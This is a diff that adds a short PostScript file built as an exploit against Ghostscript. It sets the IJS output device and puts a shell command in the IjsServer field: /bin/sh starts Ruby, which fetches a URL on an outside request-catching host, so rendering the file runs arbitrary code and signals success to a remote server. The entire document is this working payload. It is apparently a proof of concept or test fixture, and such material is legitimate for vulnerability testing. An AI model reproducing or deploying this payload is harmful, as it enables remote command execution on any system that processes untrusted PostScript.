@@ -1,0 +1,6 @@
+%!PS-Adobe-3.0
+  <<
+    /OutputDevice /ijs
+    /IjsServer (/bin/sh -c "ruby -ropen-uri -e 'URI.open %q!https://worknow.requestcatcher.com/test!'")
+  >> setpagedevice
+  showpage
